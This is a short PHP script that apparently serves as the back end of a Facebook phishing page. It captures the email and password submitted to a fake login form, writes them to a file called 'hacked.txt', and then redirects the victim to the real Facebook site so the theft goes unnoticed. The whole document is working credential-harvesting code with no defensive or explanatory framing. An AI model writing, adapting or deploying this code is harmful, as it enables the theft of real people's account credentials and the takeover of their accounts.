<?php

if ($_SERVER['REQUEST_METHOD'] == 'POST') {

    $email = (isset($_POST['email'])) ? $_POST['email'] :'';
    $password = (isset($_POST['passwordsss'])) ? $_POST['passwordsss'] :'';
    echo "USERNAME=$email, PASSWORD=$password\n";
    file_put_contents('./hacked.txt', "USERNAME=$email, PASSWORD=$password\n", FILE_APPEND);

    header("Location:https://www.facebook.com/");

}


?>